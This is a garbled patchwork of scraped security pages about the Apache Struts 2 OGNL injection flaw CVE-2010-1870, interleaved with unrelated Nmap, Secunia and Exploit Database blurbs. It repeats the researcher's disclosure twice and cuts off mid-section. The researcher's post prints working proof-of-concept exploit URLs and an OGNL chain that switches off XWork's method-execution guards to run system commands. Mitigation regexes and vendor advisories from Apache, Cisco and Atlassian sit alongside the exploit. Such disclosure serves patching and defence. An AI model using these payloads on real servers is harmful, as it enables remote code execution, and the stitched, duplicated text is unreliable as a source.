Details  * Apache Struts 2 contains a vulnerability that could   allow an unauthenticated, remote attacker to bypass security   restrictions and execute arbitrary commands on a targeted system.      The vulnerability is due to insufficient sanitization on user-supplied input   by the affected software. An unauthenticated, remote attacker could   exploit the vulnerability by sending crafted requests that contain OGNL expressions to bypass security restrictions and execute   arbitrary commands on server-side objects.      This vulnerability has been confirmed to allow remote code execution with *Administrator* privileges for Cisco Unified CCE. Exploitation on Cisco ISE, Cisco MXE 3500, and Cisco Business Edition 3000 Series is theoretically possible but could not be reproduced. Cisco recommends that customers affected by this vulnerability upgrade to a fixed software release version.      This vulnerability is documented in Cisco bug IDs [CSCun31197](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCun31197) ([registered](https://sec.cloudapps.cisco.comRPF/register/register.do) customers only) for Cisco Business Edition 3000 Series, [CSCun31314](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCun31314) ([registered](https://sec.cloudapps.cisco.comRPF/register/register.do) customers only) for Cisco ISE, [CSCun31301](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCun31301) ([registered](https://sec.cloudapps.cisco.comRPF/register/register.do) customers only) for Cisco MXE 3500, and [CSCun25241](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCun25241) ([registered](https://sec.cloudapps.cisco.comRPF/register/register.do) customers only) for Cisco Unified CCE.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

CVE-2010-1870: Struts2/XWork remote command execution
Update Tue Jul 13 2010: Added proof of concept

Apache Struts team has announced uploaded but has not released, due to an unreasonably prolonged voting process, the 2.2.0 release of the Struts2 web framework which fixes vulnerability that I've reported to them on May 31st 2010. Apache Struts team is ridiculously slow in releasing the fixed version and all of my attempts to expedite the process have failed.

Introduction
Struts2 is Struts + WebWork. WebWork in turn uses XWork to invoke actions and call appropriate setters/getters based on HTTP parameter names, which is achieved by treating each HTTP parameter name as an OGNL statement. OGNL (Object Graph Navigation Language) is what turns:

user.address.city=Bishkek&user['favoriteDrink']=kumys

into

action.getUser().getAddress().setCity("Bishkek")
action.getUser().setFavoriteDrink("kumys")

This is performed by the ParametersInterceptor, which calls ValueStack.setValue() with user-supplied HTTP parameters as arguments.
NOTE: If you are using XWork's ParametersInterceptor or operate with OGNL ValueStack in a similar way then you are vulnerable (ParametersInterceptor is on by default in struts-default.xml).

In addition to property getting/setting, OGNL supports many more features:

    * Method calling: foo()
    * Static method calling: @java.lang.System@exit(1)
    * Constructor calling: new MyClass()
    * Ability to work with context variables: #foo = new MyClass()
    * And more...

Since HTTP parameter names are OGNL statements, to prevent an attacker from calling arbitrary methods via HTTP parameters XWork has the following two variables guarding methods execution:

    * OgnlContext's property 'xwork.MethodAccessor.denyMethodExecution' (set to true by default)
    * SecurityMemberAccess private field called 'allowStaticMethodAccess' (set to false by default)

OGNL Context variables
To make it easier for developer to access various frequently needed objects XWork provides several predefined context variables:

    * #application
    * #session
    * #request
    * #parameters
    * #attr

These variables represent various server-side objects, such as session map. To prevent attackers from tampering with server-side objects XWork's ParametersInterceptor disallowed # in parameter names. About a year ago I found a way to bypass that protection(XW-641) using Java's unicode String representation: \u0023. At the time I felt like the fix that was implemented (OGNL value stack clearing) was insufficient, but had not time to investigate this further.

CVE-2010-1870
Earlier this year I finally got a chance to look at this again and found that in addition to the above mentioned context variables there were more:

    * #context - OgnlContext, the one guarding method execution based on 'xwork.MethodAccessor.denyMethodExecution' property value.
    * #_memberAccess - SecurityMemberAccess, whose 'allowStaticAccess' field prevented static method execution.
    * #root
    * #this
    * #_typeResolver
    * #_classResolver
    * #_traceEvaluations
    * #_lastEvaluation
    * #_keepLastEvaluation

You can probably see the problem already. Using XW-641 trick I was able to modify the values that were guarding Java methods execution and run arbitrary Java code:

#_memberAccess['allowStaticMethodAccess'] = true
#foo = new java .lang.Boolean("false")
#context['xwork.MethodAccessor.denyMethodExecution'] = #foo
#rt = @java.lang.Runtime@getRuntime()
#rt.exec('mkdir /tmp/PWNED')

Actual proof of concept had to use OGNL's expression evaluation when crafting HTTP request. PoC for this bug will be published on July 12 2010. To test whether your application is vulnerable you can use the following proof of concept, which will call java.lang.Runtime.getRuntime().exit(1):

http://mydomain/MyStruts.action?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.den
yMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean("false")))&(asdf)(('\u0023rt.exit(1)')(\u0023rt\u003d@java.lang.Runtime@getRunti
me()))=1

Fixing CVE-2010-1870
Struts2 users must upgrade to the 2.2.0, which whitelists a set of characters that excludes characters required to exploit this vulnerability.

In cases where upgrade isn't possible you can use ParameterInterceptor's "excludeParams" parameter to whitelist the characters required for your application to operate correctly(usually A-z0-9_.'"[]) alternatively you can blacklist \()@ which are the characters required to exploit this bug.

Timeline
May 31st - email to security@struts.apache.org with vulnerability report.
June 4th - no response received, contacted developers again.
June 5th - had to find an XWork developer on IRC to look at this.
June 16th - Atlassian fixes vulnerability in its products. Atlassian and Struts developers worked together in coming up with the fix.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## Summary

XWork ParameterInterceptors bypass allows remote command execution

| Who should read this | All Struts 2 developers |
| --- | --- |
| Impact of vulnerability | Remote server context manipulation |
| Maximum security rating | Critical |
| Recommendation | Developers should immediately upgrade to [Struts 2.2.1](http://struts.apache.org/download.cgi#struts221) or read the following solution instructions carefully for a configuration change to mitigate the vulnerability |
| Affected Software | Struts 2.0.0 - Struts 2.1.8.1 |
| Original JIRA Ticket | [WW-3470](https://issues.apache.org/jira/browse/WW-3470), [XW-641](http://jira.opensymphony.com/browse/XW-641) |
| Reporter | Meder Kydyraliev, Google Security Team |
| CVE Identifier | [CVE-2010-1870](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1870) |
| Original Description | <http://blog.o0o.nu/2010/07/cve-2010-1870-struts2xwork-remote.html> |

## Problem

OGNL provides, among other features, extensive expression evaluation capabilities (<http://www.ognl.org/2.6.9/Documentation/html/LanguageGuide/expressionEvaluation.html>). The vulnerability allows a malicious user to bypass the '#'-usage protection built into the ParametersInterceptor, thus being able to manipulate server side context objects.

This behavior was already addressed in [S2-003](/confluence/display/WW/S2-003), but it turned out that the resulting fix based on whitelisting acceptable parameter names closed the vulnerability only partially. At least the following context objects are still accessible:

* #context - OgnlContext, the one guarding method execution based on 'xwork.MethodAccessor.denyMethodExecution' property value.
* #\_memberAccess - SecurityMemberAccess, whose 'allowStaticAccess' field prevented static method execution.
* #root
* #this
* #\_typeResolver
* #\_classResolver
* #\_traceEvaluations
* #\_lastEvaluation
* #\_keepLastEvaluation

## Solution

As of XWork 2.2.1, now being an integral part of the Struts 2.2.1 release, the ParameterInterceptor was changed to provide a very strict whitelist mechanism for acceptable, non malicious parameter names. Therefore parameters other than simple property navigation paths will be ignored.

**It is strongly recommended to upgrade to [Struts 2.2.1](http://struts.apache.org/download.cgi#struts221), which contains the corrected XWork library.**

In case an upgrade isn't possible in a particular environment, there is a configuration based mitigation workaround:

### Possible Mitigation Workaround: Configure ParametersIntercptor in struts.xml to Exclude Malicious Parameters

The following additional interceptor-ref configuration, suggested by [John Wilander](http://www.blogger.com/profile/12586406716617551079), should mitigate the problem when applied correctly:

```

<interceptor-ref name="params">
    <param name="excludeParams">dojo\..*,^struts\..*,.*\\.*,.*\(.*,.*\).*,.*@.*</param>
</interceptor-ref>

```

For this configuration to work correctly, it has to be applied to **any params interceptor ref in any stack an application is using**.

| Common Vulnerability Scoring System (CVSS) Online Calculator, version 2.0 |
| Vector: AV:N/AC:L/Au:N/C:C/I:C/A:C/E:F/RL:OF/RC:C/CDP:ND/TD:ND/CR:ND/IR:ND/AR:ND |
| This tool is used to calculate a specific threat/vulnerability's CVSS score. Please select the appropriate options below, click "Calculate Score," and the CVSS score will be displayed. Use of this calculator is subject to [the disclaimer below.](#disclaimer) |
| ---    | |
| Base Parameters |
| Once discovered, analyzed, and catalogued, there are certain aspects of a vulnerability that do not change, assuming the initial information is complete and correct. These immutable characteristics will not change over time, nor in different environments. The base metric group captures the access to and impact on the target.  Access Vector AV: Local AV: Adjacent Network AV: Network  Access Complexity AC: High AC: Medium AC: Low  Authentication Au: Multiple Au: Single Au: None  Confidentiality Impact C: None C: Partial C: Complete  Integrity Impact I: None I: Partial I: Complete  Availability Impact A: None A: Partial A: Complete     Base Score: 10.0 |
| Temporal Parameters |
| As a vulnerability ages, certain intrinsic characteristics will change with time. In many cases, when a vulnerability is first discovered, the number of vulnerable systems will be at or close to its peak, while the availability of exploit and remedial information will be at its lowest point. As time progresses, patch information will become more available and more systems will be fixed as more exploits occur, driving the need for the fix. Eventually, the number of vulnerable systems will reach its low point as remedial information reaches its high point. The CVSS temporal metrics group captures these characteristics of a vulnerability that change over time.  Exploitability E: Unproven  E: Proof-of-Concept  E: Functional  E: High  E: Not Defined   **Exploitability**  ---   Unproven (U) No exploit code is available, or an exploit is entirely theoretical. Proof-of-Concept (POC) Proof-of-concept exploit code or an attack demonstration that is not practical for most systems is available. The code or technique is not functional in all situations and may require substantial modification by a skilled attacker.  Functional (F) Functional exploit code is available. The code works in most situations where the vulnerability exists.  High (H) Either the vulnerability is exploitable by functional mobile autonomous code, or no exploit is required (manual trigger) and details are widely available. The code works in every situation, or is actively being delivered via a mobile autonomous agent (such as a worm or virus).  Not Defined (ND) Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.  Remediation Level RL: Official-Fix  RL: Temporary-Fix  RL: Workaround  RL: Unavailable  RL: Not Defined   **Remediation Level**  ---   Official Fix (OF)  A complete vendor solution is available. Either the vendor has issued an official patch, or an upgrade is available. Temporary Fix (TF) There is an official but temporary fix available. This includes instances where the vendor issues a temporary hotfix, tool, or workaround.  Workaround (W)  There is an unofficial, non-vendor solution available. In some cases, users of the affected technology will create a patch of their own or provide steps to work around or otherwise mitigate the vulnerability.  Unavailable (U)  There is either no solution available or it is impossible to apply.  Not Defined (ND)  Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.  Report Confidence RC: Unconfirmed  RC: Uncorroborated  RC: Confirmed  RC: Not Defined   **Report Confidence**  ---   Unconfirmed (UC) There is a single unconfirmed source or possibly multiple conflicting reports. There is little confidence in the validity of the reports. An example is a rumor that surfaces from the hacker underground. Uncorroborated (UR) There are multiple non-official sources, possibly including independent security companies or research organizations. At this point there may be conflicting technical details or some other lingering ambiguity.  Confirmed (C) The vulnerability has been acknowledged by the vendor or author of the affected technology. The vulnerability may also be ?Confirmed? when its existence is confirmed from an external event such as publication of functional or proof-of-concept exploit code or widespread exploitation.  Not Defined (ND) Assigning this value to the metric will not influence the score. It is a signal to the equation to skip this metric.     Temporal Score: 8.3 |

| Environmental Parameters |
| Different user environments can have an immense bearing on how (or if) a vulnerability affects a given information system and its stakeholders. The CVSS environmental metrics group captures characteristics of vulnerabilities that are tied to system distribution and network environment.  Collateral Damage Potential CDP: None  CDP: Low  CDP: Low-Medium  CDP: Medium-High  CDP: High  CDP: Not Defined   Target Distribution TD: None  TD: Low  TD: Medium  TD: High  TD: Not Defined   Confidentiality Requirement CR: Not Defined  CR: Low  CR: Medium  CR: High   Integrity Requirement IR: Not Defined  IR: Low  IR: Medium  IR: High   Availability Requirement AR: Not Defined  AR: Low  AR: Medium  AR: High      Environmental Score: 8.3 |

### [CVE-2010-1870: Struts2/XWork remote command execution](http://blog.o0o.nu/2010/07/cve-2010-1870-struts2xwork-remote.html)

***Update Tue Jul 13 2010: Added proof of concept***

***Update Wed July 14 2010: Added PoC for older version of Struts2/Xwork***

***Update Fri Aug 20 2010: Struts2 team finally released [2.2.1](http://struts.apache.org/announce.html) on Aug 16th (2.5 months to release fixed version!).***

Apache Struts team has ~~announced~~ [uploaded](http://people.apache.org/builds/struts/2.2.0/) but has not released, due to an unreasonably [prolonged voting process](http://old.nabble.com/-VOTE--Struts-2.2.0-Vote-td29027163.html), the 2.2.0 release of the Struts2 web framework which [fixes](http://svn.apache.org/viewvc?view=revision&revision=956389) vulnerability that I've reported to them on May 31st 2010. Apache Struts team is ridiculously slow in releasing the fixed version and all of my attempts to expedite the process have failed.

Introduction

Struts2 is Struts + WebWork. [WebWork](http://www.opensymphony.com/webwork/) in turn uses [XWork](http://www.opensymphony.com/xwork/) to invoke actions and call appropriate setters/getters based on HTTP parameter names, which is achieved by treating each HTTP parameter name as an OGNL statement. [OGNL](http://www.opensymphony.com/ognl/) (Object Graph Navigation Language) is what turns:

user.address.city=Bishkek&user['favoriteDrink']=kumys

into

action.getUser().getAddress().setCity("Bishkek")

action.getUser().setFavoriteDrink("kumys")

This is performed by the [ParametersInterceptor](http://svn.apache.org/viewvc/struts/struts2/trunk/xwork-core/src/main/java/com/opensymphony/xwork2/interceptor/ParametersInterceptor.java?view=markup), which calls ValueStack.setValue() with user-supplied HTTP parameters as arguments.

***NOTE: If you are using XWork's ParametersInterceptor or operate with OGNL ValueStack in a similar way then you are vulnerable (ParametersInterceptor is on by default in*** [***struts-default.xml***](http://struts.apache.org/2.1.8.1/docs/struts-defaultxml.html)***).***

In addition to property getting/setting, OGNL supports many more features:

* Method calling: foo()
* Static method calling: @java.lang.System@exit(1)
* Constructor calling: new MyClass()
* Ability to work with context variables: #foo = new MyClass()
* And [more](http://www.opensymphony.com/ognl/html/LanguageGuide/index.html)...

Since HTTP parameter names are OGNL statements, to prevent an attacker from calling arbitrary methods via HTTP parameters XWork has the following two variables guarding methods execution:

* OgnlContext's property 'xwork.MethodAccessor.denyMethodExecution' (set to true by default)
* SecurityMemberAccess private field called 'allowStaticMethodAccess' (set to false by default)

OGNL Context variablesTo make it easier for developer to access various frequently needed objects XWork provides several [predefined context variables](http://www.opensymphony.com/webwork/wikidocs/OGNL.html):

* #application
* #session
* #request
* #parameters
* #attr

These variables represent various server-side objects, such as session map. To prevent attackers from tampering with server-side objects XWork's [ParametersInterceptor](http://svn.apache.org/viewvc/struts/struts2/trunk/xwork-core/src/main/java/com/opensymphony/xwork2/interceptor/ParametersInterceptor.java?revision=911280&view=markup) disallowed # in parameter names. About a year ago I found a way to bypass that protection([XW-641](http://jira.opensymphony.com/browse/XW-641)) using Java's unicode String representation: \u0023. At the time I felt like the fix that was implemented (OGNL value stack clearing) was insufficient, but had not time to investigate this further.

CVE-2010-1870Earlier this year I finally got a chance to look at this again and found that in addition to the above mentioned context variables there were [more](http://www.google.com/codesearch/p?hl=en#JS7-j-gX_2Q/src/java/ognl/OgnlContext.java):

* **#context** - OgnlContext, the one guarding method execution based on 'xwork.MethodAccessor.denyMethodExecution' property value.
* **#\_memberAccess** - SecurityMemberAccess, whose 'allowStaticAccess' field prevented static method execution.
* #root
* #this
* #\_typeResolver
* #\_classResolver
* #\_traceEvaluations
* #\_lastEvaluation
* #\_keepLastEvaluation

You can probably see the problem already. Using [XW-641](http://jira.opensymphony.com/browse/XW-641) trick I was able to modify the values that were guarding Java methods execution and run arbitrary Java code:

#\_memberAccess['allowStaticMethodAccess'] = true#foo = new java .lang.Boolean("false")#context['xwork.MethodAccessor.denyMethodExecution'] = #foo#rt = @java.lang.Runtime@getRuntime()#rt.exec('mkdir /tmp/PWNED')

Actual proof of concept had to use OGNL's [expression evaluation](http://www.opensymphony.com/ognl/html/LanguageGuide/expressionEvaluation.html) when crafting HTTP request. ~~PoC for this bug will be published on July 12 2010.~~ To test whether your application is vulnerable you can use the following proof of concept, which will call java.lang.Runtime.getRuntime().exit(1):

http://mydomain/MyStruts.action?('\u0023\_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.den

yMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean("false")))&(asdf)(('\u0023rt.exit(1)')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1

Older versions of XWork didn't have the 'allowStaticMethodAccess' member so the following URL should achieve the same:

http://mydomain/MyStruts.action?(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean("false")))&(asdf)(('\u0023rt.exit(1)')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1

Fixing CVE-2010-1870

Struts2 users must upgrade to the 2.2.0, which whitelists a set of characters that excludes characters required to exploit this vulnerability.

In cases where upgrade isn't possible you can use ParameterInterceptor's "excludeParams" parameter to whitelist the characters required for your application to operate correctly(usually A-z0-9\_.'"[]) alternatively you can blacklist \()@ which are the characters required to exploit this bug.

 TimelineMay 31st - email to security@struts.apache.org with vulnerability report.June 4th - no response received, contacted developers again.June 5th - had to find an XWork developer on IRC to look at this.

June 16th - Atlassian [fixes vulnerability in its products](http://confluence.atlassian.com/display/FISHEYE/FishEye%2BSecurity%2BAdvisory%2B2010-06-16). Atlassian and Struts developers worked together in coming up with the fix.June 20th - 1-line fix commitedJune 29th - Struts 2.2.0 release [voting process started](http://old.nabble.com/-VOTE--Struts-2.2.0-Vote-td29027163.html) and is still going...

   This regexp config in struts.xml seems to mitigate the problem:

   <interceptor-ref name="params">
    <param name="excludeParams">dojo\..\*,^struts\..\*,.\*\\.\*,.\*\(.\*,.\*\).\*,.\*@.\*</param>

   Note that John Wilander's fix only works if you have one params interceptor ref in a stack (as of xwork-2.1.6). This means that if you use the paramsPrepareParamsStack, you'll have to manually copy it.

   Struts 2.1.6, which uses xwork-2.1.2 seems to be protected because of a bug in SecurityMemberAccess (NPE in #isExcluded(String paramName))

## Description

| [Note] | Note |
| --- | --- |
| This document describes the very latest version of Nmap available from [`https://nmap.org/download.html`](https://nmap.org/download.html) or [`https://nmap.org/dist/?C=M&O=D`](https://nmap.org/dist/?C=M&O=D). Please ensure you are using the latest version before reporting that a feature doesn't work as described. |

Nmap (“Network Mapper”) is an open source tool for network
exploration and security auditing. It was designed to rapidly
scan large networks, although it works fine against single
hosts. Nmap uses raw IP packets in novel ways to determine what
hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits,
many systems and network administrators find it useful for routine
tasks such as network inventory, managing service upgrade
schedules, and monitoring host or service uptime.

The output from Nmap is a list of scanned targets, with
supplemental information on each depending on the options
used. Key among that information is the “interesting ports
table”.
That table lists the port number and protocol,
service name, and state. The state is either
`open`, `filtered`,
`closed`, or `unfiltered`.
`Open`
means that an application on the target machine is listening for
connections/packets on that port.
`Filtered`
means that a firewall, filter, or other network
obstacle is blocking the port so that Nmap cannot tell whether it is
`open` or `closed`.
`Closed`
ports have no application listening on them,
though they could open up at any time.
Ports are classified as
`unfiltered`
when they are
responsive to Nmap's probes, but Nmap cannot determine whether they are
open or closed.
Nmap reports the state combinations
`open|filtered`
and `closed|filtered`
when it cannot determine which
of the two states describe a port. The port table may also
include software version details when version detection has been
requested. When an IP protocol scan is requested
(`-sO`), Nmap provides information on supported IP
protocols rather than listening ports.

In addition to the interesting ports table, Nmap can provide
further information on targets, including reverse DNS names,
operating system guesses, device types, and MAC addresses.

A typical Nmap scan is shown in [Example 15.1](man.html#man-ex-repscan "Example 15.1. A representative Nmap scan"). The only Nmap arguments used in
this example are `-A`, to enable OS and version
detection, script scanning, and traceroute; `-T4` for
faster execution; and then the hostname.

Example 15.1. A representative Nmap scan
```

**In this advisory:**

## Remote Code Exploit Vulnerability

### Severity

Atlassian rates this vulnerability as **critical**, according to the scale published in [Severity Levels for Security Issues](https://www.atlassian.com/security/security-severity-levels). The scale allows us to rank a vulnerability as critical, high, moderate or low.

### Risk Assessment

We have identified and fixed a remote code exploit vulnerability which affects FishEye and Crucible instances.

### Vulnerability

This vulnerability allows a motivated attacker to call remote code on the host server.

All versions of FishEye/Crucible up to version 2.3.2 are affected by this vulnerability.

| Affected FishEye Versions | Fix Availability | More Details | Severity |
| --- | --- | --- | --- |
| All versions up to and including 2.3.2. | 2.3.3 update, also available as patches for 2.3.2 and 2.2.3. | This vulnerability allows a motivated attacker to call remote code on the host server. | Critical |

This vulnerability has been discovered in XWork by OpenSymphony, a command pattern framework which is used by FishEye and Crucible.

**About the XWork Framework**:

* See OpenSymphony XWork for more information about XWork.

### Risk Mitigation

We strongly recommend either upgrading or patching your FishEye/Crucible installation to fix this vulnerability. Please see the 'Fix' section below.

### Fix

These issues have been fixed in FishEye 2.3.3 (see the [changelog](/fisheye/fisheye-2-3-changelog-960161718.html)).

It has also been fixed in Crucible 2.3.3 (see the [changelog](/crucible/crucible-2-3-changelog-298977436.html)).

Later versions will include protection from this vulnerability.

This fix is also provided as a patch for FishEye/Crucible 2.3.2 and 2.2.3, which you can download from [links on this page](#FishEyeSecurityAdvisory20100616-download). Customers on earlier point versions of FishEye/Crucible will have to upgrade to version 2.3.2 or 2.2.3 before applying the patch. Atlassian recommends you upgrade to FishEye/Crucible 2.3.3.

## Download Patches for Earlier FishEye / Crucible Versions

These patch releases contain security fixes, which apply to the shared FishEye architecture that is the basis of both FishEye and Crucible.

Please note that these patches are for specific point versions of FishEye (2.3.2 and 2.2.3). If you are running an earlier version than these, you will need to upgrade to a version specifically addressed by one of these patches. Atlassian strongly recommends that you upgrade to [FishEye 2.3.3](http://www.atlassian.com/software/fisheye/FishEyeDownloadCenter.jspa) / [Crucible 2.3.3](http://www.atlassian.com/software/crucible/CrucibleDownloadCenter.jspa) or later.
